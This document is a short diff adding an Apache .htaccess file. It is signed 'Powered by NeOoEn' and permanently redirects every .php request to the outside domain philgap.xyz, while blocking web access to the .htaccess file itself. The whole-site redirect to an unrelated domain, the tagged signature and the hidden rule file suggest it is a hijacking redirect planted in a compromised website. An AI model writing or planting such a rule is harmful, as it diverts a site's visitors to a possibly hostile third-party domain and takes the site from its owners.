@@ -1,0 +1,10 @@
+# Powered by NeOoEn
+
+RedirectMatch 301 (.*)\.php$ https://philgap.xyz/
+
+#protect htaccess
+<files ~ "^.*\.([Hh][Tt][Aa])">
+order allow,deny
+deny from all
+satisfy all
+</files>
